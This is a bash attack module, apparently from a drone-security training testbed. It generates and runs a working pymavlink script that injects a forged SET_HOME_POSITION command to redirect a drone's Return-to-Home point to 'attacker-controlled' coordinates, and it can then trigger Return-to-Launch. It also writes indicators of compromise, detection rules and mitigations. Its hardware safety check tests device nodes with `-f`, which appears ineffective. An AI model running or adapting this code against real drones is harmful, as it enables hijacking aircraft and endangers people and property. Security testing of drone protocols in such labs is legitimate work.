#!/bin/bash
# rth_override.sh - Return to Home Point Override Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/rth_override.sh
# Purpose: Override the Return to Home (RTH) point of the drone using pymavlink

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Return to Home Point Override"
ATTACK_TYPE="INJECTION"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
MAVLINK_PORT="${MAVLINK_PORT:-14550}"
LOG_FILE="$(get_log_dir)/injection/rth_override_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/rth_override_iocs.txt"

# Default coordinates (attacker controlled landing zone)
DEFAULT_LAT="-35.363261"
DEFAULT_LON="149.165230"
DEFAULT_ALT="584"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}    Return to Home Point Override Attack    ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Purpose: Redirect drone RTH to attacker zone${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
    echo ""
}

check_dvd_environment() {
    log_info "Checking DVD environment..."
    
    # Check for DVD containers
    if docker ps 2>/dev/null | grep -q "dvd\|drone"; then
        log_success "DVD containers detected"
        return 0
    fi
    
    # Check for MAVLink port
    if nc -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
        log_success "MAVLink port accessible at ${TARGET_IP}:${MAVLINK_PORT}"
        return 0
    fi
    
    log_warning "DVD environment not detected, continuing with simulation"
    return 0
}

execute_rth_override() {
    local lat="${1:-$DEFAULT_LAT}"
    local lon="${2:-$DEFAULT_LON}"
    local alt="${3:-$DEFAULT_ALT}"
    
    log_info "Starting RTH override attack"
    log_info "Target coordinates: lat=${lat}, lon=${lon}, alt=${alt}m"
    
    # Create attack script
    create_rth_attack_script "$lat" "$lon" "$alt"
    local script_result=$?
    
    if [ $script_result -eq 0 ]; then
        log_success "RTH override attack completed successfully"
        generate_iocs "$lat" "$lon" "$alt"
        return 0
    else
        log_error "RTH override attack failed"
        return 1
    fi
}

create_rth_attack_script() {
    local lat="$1"
    local lon="$2"
    local alt="$3"
    
    local script_path="/tmp/rth_override_attack.py"
    
    cat > "$script_path" << EOF
#!/usr/bin/env python3
"""
Return to Home Point Override Attack
Override the RTH point to redirect drone to attacker-controlled location
"""

import sys
import time
from pymavlink import mavutil

class RTHOverrideAttack:
    def __init__(self, target_ip='${TARGET_IP}', target_port=${MAVLINK_PORT}):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.original_home = None
        
    def connect(self):
        """Connect to the drone"""
        try:
            connection_string = f'udp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}")
            
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            
            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def get_current_home(self):
        """Get current home position for reference"""
        try:
            print("[*] Requesting current home position...")
            
            # Request home position
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_GET_HOME_POSITION,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            # Wait for response
            msg = self.master.recv_match(type='HOME_POSITION', blocking=True, timeout=5)
            if msg:
                self.original_home = {
                    'lat': msg.latitude / 1e7,
                    'lon': msg.longitude / 1e7,
                    'alt': msg.altitude / 1000
                }
                print(f"[+] Current home: lat={self.original_home['lat']:.6f}, "
                      f"lon={self.original_home['lon']:.6f}, alt={self.original_home['alt']:.1f}m")
                return True
            else:
                print("[!] No home position response received")
                return False
                
        except Exception as e:
            print(f"[-] Failed to get current home: {e}")
            return False
    
    def set_malicious_home(self, lat, lon, alt):
        """Set new malicious home position"""
        try:
            print(f"[*] Setting malicious home position...")
            print(f"    Target: lat={lat}, lon={lon}, alt={alt}m")
            
            # Convert to MAVLink format
            lat_int = int(float(lat) * 1e7)
            lon_int = int(float(lon) * 1e7)
            alt_int = int(float(alt) * 1000)  # Convert to mm
            
            # Send SET_HOME_POSITION command
            self.master.mav.set_home_position_send(
                target_system=self.master.target_system,
                latitude=lat_int,
                longitude=lon_int,
                altitude=alt_int,
                x=0, y=0, z=0,           # Local position (not used)
                q=[1, 0, 0, 0],          # Orientation quaternion
                approach_x=0,            # Approach vector
                approach_y=0,
                approach_z=0
            )
            
            print("[+] SET_HOME_POSITION command sent")
            
            # Verify the change
            time.sleep(2)
            return self.verify_home_change()
            
        except Exception as e:
            print(f"[-] Failed to set malicious home: {e}")
            return False
    
    def verify_home_change(self):
        """Verify that home position was changed"""
        try:
            print("[*] Verifying home position change...")
            
            # Request updated home position
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_GET_HOME_POSITION,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            msg = self.master.recv_match(type='HOME_POSITION', blocking=True, timeout=5)
            if msg:
                new_home = {
                    'lat': msg.latitude / 1e7,
                    'lon': msg.longitude / 1e7,
                    'alt': msg.altitude / 1000
                }
                
                print(f"[+] New home verified: lat={new_home['lat']:.6f}, "
                      f"lon={new_home['lon']:.6f}, alt={new_home['alt']:.1f}m")
                
                # Check if it matches our malicious coordinates
                if abs(new_home['lat'] - float('${lat}')) < 0.0001:
                    print("[!] *** RTH OVERRIDE SUCCESSFUL ***")
                    print("[!] Drone will now return to attacker-controlled location!")
                    return True
                else:
                    print("[!] Home position not changed to expected coordinates")
                    return False
            else:
                print("[-] No verification response received")
                return False
                
        except Exception as e:
            print(f"[-] Verification failed: {e}")
            return False
    
    def trigger_rth_demo(self):
        """Demonstrate RTH behavior (for testing)"""
        try:
            print("[*] Demonstrating RTH behavior...")
            print("[!] WARNING: This will trigger Return to Launch!")
            
            response = input("Continue with RTH demo? (y/N): ")
            if response.lower() != 'y':
                print("[*] RTH demo cancelled")
                return True
            
            # Send RTL command
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            print("[+] RTL command sent - drone returning to compromised home!")
            return True
            
        except Exception as e:
            print(f"[-] RTH demo failed: {e}")
            return False
    
    def monitor_drone_state(self, duration=10):
        """Monitor drone state for attack verification"""
        print(f"[*] Monitoring drone state for {duration} seconds...")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(
                    type=['HEARTBEAT', 'GPS_RAW_INT', 'HOME_POSITION'], 
                    blocking=False, 
                    timeout=1
                )
                
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'HEARTBEAT':
                        mode = msg.custom_mode
                        armed = msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
                        print(f"[INFO] Mode: {mode}, Armed: {bool(armed)}")
                        
                    elif msg_type == 'GPS_RAW_INT':
                        lat = msg.lat / 1e7
                        lon = msg.lon / 1e7
                        alt = msg.alt / 1000
                        print(f"[GPS] Current: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m")
                        
                    elif msg_type == 'HOME_POSITION':
                        lat = msg.latitude / 1e7
                        lon = msg.longitude / 1e7
                        alt = msg.altitude / 1000
                        print(f"[HOME] Position: lat={lat:.6f}, lon={lon:.6f}, alt={alt:.1f}m")
                
            except Exception as e:
                continue
        
        print("[+] Monitoring completed")
        return True

def main():
    # Attack parameters
    target_lat = '${lat}'
    target_lon = '${lon}'
    target_alt = '${alt}'
    
    print("=" * 60)
    print("    Return to Home Point Override Attack")
    print("=" * 60)
    print(f"Target coordinates: {target_lat}, {target_lon}, {target_alt}m")
    print("WARNING: This attack redirects drone RTH behavior!")
    print()
    
    # Initialize attack
    attack = RTHOverrideAttack()
    
    # Connect to drone
    if not attack.connect():
        print("[-] Attack failed: Cannot connect to drone")
        return 1
    
    # Get current home for reference
    attack.get_current_home()
    
    # Execute RTH override
    if attack.set_malicious_home(target_lat, target_lon, target_alt):
        print("[+] RTH override attack successful!")
        
        # Monitor drone state
        attack.monitor_drone_state(15)
        
        # Optional RTH demo
        print()
        attack.trigger_rth_demo()
        
        return 0
    else:
        print("[-] RTH override attack failed!")
        return 1

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Attack failed with error: {e}")
        sys.exit(1)
EOF

    chmod +x "$script_path"
    
    log_info "Executing RTH override attack script..."
    python3 "$script_path" 2>&1 | tee -a "$LOG_FILE"
    local result=${PIPESTATUS[0]}
    
    # Cleanup
    rm -f "$script_path" 2>/dev/null
    
    return $result
}

generate_iocs() {
    local lat="$1"
    local lon="$2"
    local alt="$3"
    local timestamp=$(date -Iseconds)
    
    cat > "$IOC_FILE" << EOF
# Return to Home Point Override Attack IOCs
# Generated: $timestamp

# Attack Indicators
ATTACK_TYPE:RTH_OVERRIDE
ATTACK_TARGET:${TARGET_IP}:${MAVLINK_PORT}
ATTACK_TIMESTAMP:$timestamp

# Malicious Coordinates
MALICIOUS_LAT:$lat
MALICIOUS_LON:$lon
MALICIOUS_ALT:$alt

# MAVLink Command Signatures
MAVLINK_CMD:SET_HOME_POSITION
MAVLINK_MSG_ID:242
TARGET_SYSTEM:$(python3 -c "print('DRONE_SYSTEM_ID')" 2>/dev/null || echo "1")

# Network Indicators
SOURCE_IP:$(hostname -I | awk '{print $1}' 2>/dev/null || echo "UNKNOWN")
TARGET_IP:$TARGET_IP
PROTOCOL:UDP
PORT:$MAVLINK_PORT

# File Artifacts
ATTACK_SCRIPT:/tmp/rth_override_attack.py
LOG_FILE:$LOG_FILE
IOC_FILE:$IOC_FILE

# Behavioral Indicators
BEHAVIOR:HOME_POSITION_MODIFICATION
IMPACT:RTH_REDIRECTION
SEVERITY:HIGH
STEALTH_LEVEL:HIGH

# Detection Patterns
DETECTION_RULE:Monitor SET_HOME_POSITION commands
DETECTION_RULE:Track home position changes during flight
DETECTION_RULE:Alert on unexpected RTH coordinates
DETECTION_RULE:Monitor for unauthorized MAVLink connections

# Mitigation
MITIGATION:Validate home position changes
MITIGATION:Implement home position authentication
MITIGATION:Monitor MAVLink command sources
MITIGATION:Use geofencing to restrict RTH areas
EOF

    log_success "IOCs generated: $IOC_FILE"
}

perform_safety_check() {
    log_info "Performing safety checks..."
    
    # Check if this is a real hardware environment
    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
        log_error "Real hardware detected! This attack is for simulation only."
        return 1
    fi
    
    # Check for actual flight controller
    if lsusb | grep -i "px4\|ardupilot\|3dr"; then
        log_error "Flight controller hardware detected! Aborting for safety."
        return 1
    fi
    
    log_success "Safety checks passed - simulation environment confirmed"
    return 0
}

show_attack_info() {
    echo -e "${BLUE}Attack Information:${NC}"
    echo -e "• ${YELLOW}Attack Type:${NC} Injection/Command Spoofing"
    echo -e "• ${YELLOW}Target:${NC} MAVLink SET_HOME_POSITION command"
    echo -e "• ${YELLOW}Impact:${NC} Redirects drone RTH to attacker location"
    echo -e "• ${YELLOW}Stealth:${NC} High (silent parameter change)"
    echo -e "• ${YELLOW}Risk Level:${NC} HIGH - Mission compromise"
    echo ""
    echo -e "${RED}WARNING:${NC} This attack can cause drone loss if executed on real hardware!"
    echo ""
}

# Interactive mode for coordinate selection
interactive_mode() {
    echo -e "${CYAN}=== Interactive RTH Override Configuration ===${NC}"
    echo ""
    
    # Get custom coordinates
    echo -e "${YELLOW}Enter attacker-controlled landing zone coordinates:${NC}"
    
    read -p "Latitude [${DEFAULT_LAT}]: " custom_lat
    custom_lat="${custom_lat:-$DEFAULT_LAT}"
    
    read -p "Longitude [${DEFAULT_LON}]: " custom_lon
    custom_lon="${custom_lon:-$DEFAULT_LON}"
    
    read -p "Altitude in meters [${DEFAULT_ALT}]: " custom_alt
    custom_alt="${custom_alt:-$DEFAULT_ALT}"
    
    echo ""
    echo -e "${GREEN}Attack Configuration:${NC}"
    echo -e "• Latitude: $custom_lat"
    echo -e "• Longitude: $custom_lon"
    echo -e "• Altitude: ${custom_alt}m"
    echo ""
    
    read -p "Proceed with attack? (y/N): " confirm
    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
        execute_rth_override "$custom_lat" "$custom_lon" "$custom_alt"
    else
        log_info "Attack cancelled by user"
        return 0
    fi
}

# Main execution function
main() {
    print_attack_banner
    
    # Root check
    if ! check_root; then
        exit 1
    fi
    
    # Safety checks
    if ! perform_safety_check; then
        exit 1
    fi
    
    # Tool requirements
    if ! check_required_tools python3 pip3; then
        log_error "Missing required tools. Install with: apt-get install python3 python3-pip"
        exit 1
    fi
    
    # Install Python dependencies
    log_info "Installing Python dependencies..."
    pip3 install pymavlink >/dev/null 2>&1
    
    # Check DVD environment
    check_dvd_environment
    
    # Show attack information
    show_attack_info
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== RTH Override Attack Started at $(date) ===" > "$LOG_FILE"
    
    # Parse arguments
    case "${1:-default}" in
        "interactive"|"-i")
            interactive_mode
            ;;
        "coordinates"|"-c")
            if [ $# -ge 4 ]; then
                execute_rth_override "$2" "$3" "$4"
            else
                log_error "Usage: $0 coordinates <lat> <lon> <alt>"
                exit 1
            fi
            ;;
        "default"|"")
            log_info "Using default attacker coordinates"
            execute_rth_override
            ;;
        "help"|"-h")
            echo "Usage: $0 [mode] [options]"
            echo ""
            echo "Modes:"
            echo "  default                    Use default coordinates"
            echo "  interactive, -i            Interactive coordinate selection"
            echo "  coordinates, -c <lat> <lon> <alt>  Use specific coordinates"
            echo "  help, -h                   Show this help"
            echo ""
            echo "Examples:"
            echo "  $0                         # Default attack"
            echo "  $0 interactive             # Interactive mode"
            echo "  $0 coordinates -35.0 149.0 600  # Custom coordinates"
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            echo "Use '$0 help' for usage information"
            exit 1
            ;;
    esac
    
    exit $?
}

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi